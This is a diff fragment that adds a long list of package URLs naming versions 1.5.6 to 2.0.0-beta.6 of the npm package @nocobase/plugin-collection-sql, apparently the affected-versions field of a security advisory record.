+      - pkg:npm/%40nocobase/plugin-collection-sql@1.5.6
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.5.7
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.5.8
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.5.9
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.5.10
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.5.11
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.5.12
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.5.13
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.5.14
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.5.15
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.5.16
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.5.17
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.5.18
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.5.19
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.5.20
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.5.21
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.5.22
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.5.23
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.5.24
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.5.25
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.5.26
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.0-alpha.1
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.0-alpha.2
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.0-alpha.3
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.0-alpha.4
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.0-alpha.5
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.0-alpha.6
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.0-alpha.7
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.0-alpha.8
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.0-alpha.9
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.0-alpha.10
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.0-alpha.11
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.0-alpha.12
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.0-alpha.13
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.0-alpha.14
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.0-alpha.15
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.0-alpha.16
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.0-alpha.17
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.0-alpha.18
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.0-alpha.19
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.0-alpha.20
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.0-alpha.21
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.0-alpha.22
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.0-alpha.23
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.0-alpha.24
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.0-alpha.25
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.0-alpha.26
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.0-alpha.27
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.0-alpha.28
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.0-alpha.29
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.0-alpha.30
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.0-alpha.31
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.0-beta.1
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.0-beta.2
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.0-beta.3
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.0-beta.4
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.0-beta.5
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.0-beta.6
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.0-beta.7
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.0-beta.8
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.0-beta.9
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.0-beta.10
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.0-beta.11
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.0-beta.12
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.0-beta.13
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.0-beta.14
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.0-beta.15
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.0-beta.16
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.0-beta.17
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.0-beta.18
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.0-beta.19
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.0
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.1
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.2
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.3
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.4
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.5
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.6
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.7
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.8
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.9
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.10
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.11
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.12
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.13
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.14
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.15
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.16
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.17
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.18
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.19
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.20
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.21
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.22
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.23
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.24
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.25
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.26
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.27
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.28
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.29
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.30
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.31
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.32
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.33
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.34
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.35
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.36
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.37
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.6.38
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.7.0-alpha.1
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.7.0-alpha.2
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.7.0-alpha.3
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.7.0-alpha.4
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.7.0-alpha.10
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.7.0-alpha.11
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.7.0-alpha.12
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.7.0-alpha.13
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.7.0-alpha.14
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.7.0-alpha.15
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.7.0-beta.1
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.7.0-beta.2
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.7.0-beta.3
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.7.0-beta.4
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.7.0-beta.5
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.7.0-beta.6
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.7.0-beta.7
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.7.0-beta.8
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.7.0-beta.9
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.7.0-beta.10
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.7.0-beta.11
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.7.0-beta.12
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.7.0-beta.13
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.7.0-beta.14
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.7.0-beta.15
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.7.0-beta.16
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.7.0-beta.17
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.7.0-beta.18
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.7.0-beta.19
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.7.0-beta.20
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.7.0-beta.21
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.7.0-beta.22
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.7.0-beta.23
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.7.0-beta.24
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.7.0-beta.25
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.7.0-beta.26
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.7.0-beta.27
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.7.0-beta.28
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.7.0-beta.29
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.7.0-beta.30
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.7.0-beta.31
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.7.0-beta.32
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.7.0-beta.33
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.7.0-beta.34
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.7.0
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.7.1
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.7.2
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.7.3
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.7.4
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.7.5
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.7.6
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.7.7
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.7.8
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.7.9
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.7.10
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.7.11
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.7.12
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.7.13
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.7.14
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.7.15
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.7.16
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.7.17
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.7.18
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.7.19
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.7.20
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.8.0-alpha.1
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.8.0-alpha.2
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.8.0-alpha.3
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.8.0-alpha.4
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.8.0-alpha.5
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.8.0-alpha.6
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.8.0-alpha.7
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.8.0-alpha.8
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.8.0-alpha.9
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.8.0-alpha.10
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.8.0-alpha.11
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.8.0-alpha.12
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.8.0-alpha.13
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.8.0-alpha.14
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.8.0-beta.1
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.8.0-beta.2
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.8.0-beta.3
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.8.0-beta.4
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.8.0-beta.5
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.8.0-beta.6
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.8.0-beta.7
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.8.0-beta.8
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.8.0-beta.9
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.8.0-beta.10
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.8.0-beta.11
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.8.0-beta.12
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.8.0-beta.13
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.8.0
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.8.1
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.8.2
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.8.3
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.8.4
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.8.5
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.8.6
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.8.7
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.8.8
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.8.9
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.8.10
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.8.11
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.8.12
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.8.13
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.8.14
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.8.15
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.8.16
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.8.17
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.8.18
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.8.19
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.8.20
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.8.21
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.8.22
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.8.23
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.8.24
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.8.25
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.8.26
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.8.27
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.8.28
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.8.29
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.8.30
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.8.31
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.8.32
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.8.33
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.0-alpha.1
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.0-alpha.2
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.0-alpha.3
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.0-alpha.4
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.0-alpha.5
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.0-alpha.6
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.0-alpha.7
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.0-alpha.8
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.0-alpha.9
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.0-alpha.10
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.0-alpha.11
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.0-alpha.12
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.0-alpha.13
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.0-alpha.14
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.0-alpha.15
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.0-alpha.16
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.0-alpha.17
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.0-beta.1
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.0-beta.2
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.0-beta.3
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.0-beta.4
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.0-beta.5
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.0-beta.6
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.0-beta.7
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.0-beta.8
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.0-beta.9
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.0-beta.10
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.0-beta.11
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.0-beta.12
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.0-beta.13
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.0-beta.14
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.0-beta.15
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.0-beta.16
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.0-beta.17
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.0-beta.18
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.0
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.1
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.2
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.3
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.4
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.5
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.6
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.7
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.8
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.9
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.10
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.11
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.12
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.13
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.14
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.15
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.16
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.17
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.18
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.19
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.20
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.21
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.22
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.23
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.24
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.25
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.26
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.27
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.28
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.29
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.30
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.31
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.32
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.33
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.34
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.35
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.36
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.37
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.38
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.39
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.40
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.41
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.42
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.43
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.44
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.45
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.46
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.47
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.49
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.51
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.52
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.53
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.54
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.55
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.56
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.57
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.58
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.59
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.60
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.61
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.62
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.63
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.64
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.66
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.68
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.70
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.72
+      - pkg:npm/%40nocobase/plugin-collection-sql@1.9.74
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-alpha.2
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-alpha.3
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-alpha.4
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-alpha.5
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-alpha.6
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-alpha.7
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-alpha.8
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-alpha.9
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-alpha.10
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-alpha.11
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-alpha.12
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-alpha.13
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-alpha.14
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-alpha.15
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-alpha.16
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-alpha.17
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-alpha.18
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-alpha.19
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-alpha.20
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-alpha.21
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-alpha.22
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-alpha.23
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-alpha.24
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-alpha.25
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-alpha.26
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-alpha.27
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-alpha.28
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-alpha.29
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-alpha.30
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-alpha.31
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-alpha.32
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-alpha.33
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-alpha.34
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-alpha.35
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-alpha.36
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-alpha.37
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-alpha.38
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-alpha.39
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-alpha.40
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-alpha.41
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-alpha.42
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-alpha.43
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-alpha.44
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-alpha.45
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-alpha.46
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-alpha.47
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-alpha.48
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-alpha.49
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-alpha.50
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-alpha.51
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-alpha.52
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-alpha.53
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-alpha.54
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-alpha.55
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-alpha.56
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-alpha.57
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-alpha.58
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-alpha.59
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-alpha.60
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-alpha.61
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-alpha.62
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-alpha.63
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-alpha.64
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-alpha.65
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-alpha.66
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-alpha.67
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-alpha.68
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-alpha.69
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-alpha.70
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-alpha.71
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-beta.1
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-beta.2
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-beta.3
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-beta.4
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-beta.5
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-beta.6
